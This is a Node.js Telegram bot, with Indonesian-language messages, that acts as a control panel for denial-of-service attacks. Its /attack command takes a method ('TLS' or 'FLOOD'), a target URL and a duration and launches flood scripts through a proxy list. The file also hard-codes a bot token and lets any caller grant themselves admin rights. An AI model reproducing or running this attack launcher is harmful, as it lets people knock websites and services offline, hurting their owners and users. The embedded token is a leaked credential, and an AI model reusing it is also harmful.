const Telegraf = require('telegraf');
const fs = require('fs');

const bot = new Telegraf('7205717838:AAHAEIOChEFOiiXqb-qksqWpIH0Cr_xtLzQ');

let userDiizinkan = [];
const adminIds = fs.readFileSync('admin.txt', 'utf8').split('\n').filter(id => id.trim() !== '');

bot.command('attack', (ctx) => {
    const args = ctx.message.text.split(' ');
    const metode = args[1];
    const url = args[2];
    const waktu = args[3];
    
    const userId = ctx.message.from.id.toString();
    
    if (userDiizinkan.includes(userId) || adminIds.includes(userId)) {
        if (metode === 'TLS') {
            const spawn = require('child_process').spawn;
            const ls = spawn('node', ['tls.js', url, waktu, '512', '10', 'proxy.txt']);
            
            ls.stdout.on('data', (data) => {
                console.log(`stdout: ${data}`);
            });
            
            ls.stderr.on('data', (data) => {
                console.error(`stderr: ${data}`);
            });
            
            ls.on('close', (code) => {
                console.log(`child process exited with code ${code}`);
            });
        } else if (metode === 'FLOOD') {
            const spawn = require('child_process').spawn;
            const ls = spawn('node', ['flood.js', url, waktu, '512', '10', 'proxy.txt']);
            
            ls.stdout.on('data', (data) => {
                console.log(`stdout: ${data}`);
            });
            
            ls.stderr.on('data', (data) => {
                console.error(`stderr: ${data}`);
            });
            
            ls.on('close', (code) => {
                console.log(`child process exited with code ${code}`);
            });
        } else {
            ctx.reply('Metode serangan tidak valid. Gunakan TLS atau FLOOD.');
        }
    } else {
        ctx.reply('Anda tidak diizinkan menggunakan bot ini.');
    }
});

bot.command('help', (ctx) => {
    ctx.reply('Perintah yang tersedia: \n/attack METHODS (url) (time)\n/add (username) \n/delete (username)');
});

bot.command('add', (ctx) => {
    const username = ctx.message.text.split(' ')[1];
    const userId = ctx.message.from.id.toString();
    if (userDiizinkan.includes(userId) || adminIds.includes(userId)) {
        userDiizinkan.push(username);
        fs.writeFileSync('name.txt', userDiizinkan.join('\n'));
        ctx.reply(`User ${username} telah ditambahkan.`);
    } else {
        ctx.reply('Anda tidak berhak untuk menggunakan perintah ini.');
    }
});

bot.command('delete', (ctx) => {
    const username = ctx.message.text.split(' ')[1];
    const userId = ctx.message.from.id.toString();
    if (userDiizinkan.includes(userId) || adminIds.includes(userId)) {
        userDiizinkan = userDiizinkan.filter(user => user !== username);
        fs.writeFileSync('name.txt', userDiizinkan.join('\n'));
        ctx.reply(`User ${username} telah dihapus.`);
    } else {
        ctx.reply('Anda tidak berhak untuk menggunakan perintah ini.');
    }
});

bot.command('addadmin', (ctx) => {
    const adminId = ctx.message.from.id.toString();
    fs.appendFileSync('admin.txt', adminId + '\n');
    ctx.reply('Admin berhasil ditambahkan!');
});

bot.launch();
